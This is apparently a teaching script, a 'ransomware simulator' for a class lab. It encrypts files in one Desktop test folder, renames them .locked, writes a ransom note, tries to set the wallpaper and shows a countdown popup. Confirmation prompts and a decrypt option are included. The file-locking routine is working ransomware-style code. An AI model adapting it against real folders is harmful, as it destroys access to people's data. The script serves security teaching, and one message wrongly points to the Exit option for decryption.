#!/usr/bin/env python3
# beginner ransomware simulator for a class lab

from cryptography.fernet import Fernet
import os
import time
import ctypes       # for changing wallpaper on Windows (may fail on non-Windows)
import tkinter as tk
from tkinter import messagebox

# -----------------------
# simple config / paths
# -----------------------
home = os.path.expanduser("~")
# Windows-style test folder on desktop (change if you want)
test_folder = os.path.join(home, "OneDrive", "Desktop", "lab8folder")
# key file in current working dir
key_file = "key.key"

# allowed file types to encrypt (less dangerous than everything)
GOOD_EXTS = (".txt", ".md", ".docx", ".pdf", ".jpg", ".png", ".csv")

# -----------------------
# key functions (basic)
# -----------------------
def write_key():
    print("Generating key ...")
    k = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(k)
    print("Key written to", key_file)
    return k

def load_key():
    print("Loading key ...")
    with open(key_file, "rb") as f:
        return f.read()

def get_fernet():
    # make sure key exists, otherwise create it
    if not os.path.exists(key_file):
        print("Key not found. Making new key.")
        k = write_key()
    else:
        k = load_key()
    return Fernet(k)

# -----------------------
# helper: list files in test folder
# -----------------------
def list_files_to_touch():
    files = []
    if not os.path.exists(test_folder):
        print("Test folder does not exist. Creating it now:", test_folder)
        os.makedirs(test_folder, exist_ok=True)
    # only target files with allowed extensions to reduce risk
    for root, dirs, filenames in os.walk(test_folder):
        for name in filenames:
            if name.lower().endswith(GOOD_EXTS):
                files.append(os.path.join(root, name))
    return files

# -----------------------
# encrypt / decrypt
# -----------------------
def encrypt_test_files():
    fernet = get_fernet()
    files = list_files_to_touch()
    if not files:
        print("No files with allowed extensions found in", test_folder)
        return
    print("Files that will be encrypted:")
    for x in files:
        print(" ", x)
    answer = input("Are you sure you want to encrypt THESE files? (yes/no): ")
    if answer.lower() != "yes":
        print("Encryption cancelled.")
        return
    for file_path in files:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            newdata = fernet.encrypt(data)
            # overwrite file with encrypted content and add .locked extension
            with open(file_path, "wb") as f:
                f.write(newdata)
            os.rename(file_path, file_path + ".locked")
            print("Encrypted:", file_path)
        except Exception as e:
            print("Failed encrypting", file_path, "->", e)
    print("Encryption complete. Remember: this is a simulation for class only.")

def decrypt_test_files():
    fernet = get_fernet()
    # find .locked files only
    locked_files = []
    for root, dirs, filenames in os.walk(test_folder):
        for name in filenames:
            if name.endswith(".locked"):
                locked_files.append(os.path.join(root, name))
    if not locked_files:
        print("No .locked files found in", test_folder)
        return
    print("Files that will be decrypted:")
    for f in locked_files:
        print(" ", f)
    answer = input("Are you sure you want to decrypt THESE files? (yes/no): ")
    if answer.lower() != "yes":
        print("Decryption cancelled.")
        return
    for file_path in locked_files:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            newdata = fernet.decrypt(data)
            orig_path = file_path[:-7]  # remove ".locked"
            with open(orig_path, "wb") as f:
                f.write(newdata)
            os.remove(file_path)
            print("Decrypted:", orig_path)
        except Exception as e:
            print("Failed decrypting", file_path, "->", e)
    print("Decryption finished.")

# -----------------------
# ransomware simulation: wallpaper + popup with timer
# -----------------------
def set_wallpaper_note():
    # attempt to set wallpaper (Windows). Many Windows setups accept JPG/PNG; sometimes BMP is required.
    # This function tries and fails gracefully if not Windows.
    note_txt = os.path.join(test_folder, "RANSOM_NOTE.txt")
    try:
        with open(note_txt, "w") as f:
            f.write("!!! YOUR FILES ARE ENCRYPTED !!!\n")
            f.write("This is a training simulation for cybersecurity class.\n")
            f.write("Use the 'Decrypt files' option in the simulator to restore.\n")
            f.write("\n-- Training Lab --\n")
        # Try to set the text file as wallpaper (will probably not show as image on some systems)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, note_txt, 3)
        print("Tried to set wallpaper to ransom note (may not work on all systems).")
    except Exception as e:
        print("Could not change wallpaper (not Windows or permission issue):", e)

def popup_with_timer(seconds=20):
    # Simple tkinter popup with countdown label - beginner style
    root = tk.Tk()
    root.title("RANSOMWARE SIMULATION")
    root.geometry("450x200")
    # keep on top
    root.attributes("-topmost", True)
    label1 = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED", font=("Arial", 14))
    label1.pack(pady=10)
    label2 = tk.Label(root, text="This is a training simulation. Files are in lab8folder.", font=("Arial", 10))
    label2.pack(pady=5)
    timer_label = tk.Label(root, text="", font=("Arial", 12))
    timer_label.pack(pady=10)

    def tick(t):
        if t <= 0:
            timer_label.config(text="Timer finished. You can decrypt files now.")
            # optional: show a message box too
            messagebox.showinfo("Simulation", "Timer finished. Use the decrypt option to restore files.")
            root.after(1000, root.destroy)
            return
        timer_label.config(text=f"Time left: {t} seconds")
        root.after(1000, lambda: tick(t - 1))

    # start countdown
    tick(seconds)
    root.mainloop()

def ransomware_simulation():
    print("\n*** RANSOMWARE SIMULATION (training only) ***")
    print("This will encrypt files only in the test folder:", test_folder)
    print("It will also try to change the wallpaper and show a popup with a timer.")
    ok = input("Type 'simulate' to proceed or anything else to cancel: ")
    if ok != "simulate":
        print("Simulation cancelled.")
        return
    # encrypt test files (will ask for confirmation again inside)
    encrypt_test_files()
    # set wallpaper (best-effort)
    set_wallpaper_note()
    # popup countdown (20 seconds by default)
    popup_with_timer(20)
    print("Simulation done. You may now decrypt files using option 4 in the menu.")

# -----------------------
# simple menu, beginner-style
# -----------------------
def menu():
    while True:
        print("\nWhat do you want to do?")
        print("1 - Encrypt test files (in lab8folder)")
        print("2 - Decrypt test files (in lab8folder)")
        print("3 - Simulate ransomware (encrypt + wallpaper + timer)")
        print("4 - Exit")
        choice = input("Enter number: ")
        if choice == "1":
            encrypt_test_files()
        elif choice == "2":
            decrypt_test_files()
        elif choice == "3":
            ransomware_simulation()
        elif choice == "4":
            print("Bye")
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    print("Ransomware Simulator (beginner style).")
    print("Make sure lab8folder exists on your Desktop and has some small test files (.txt, .jpg, etc.)")
    menu()
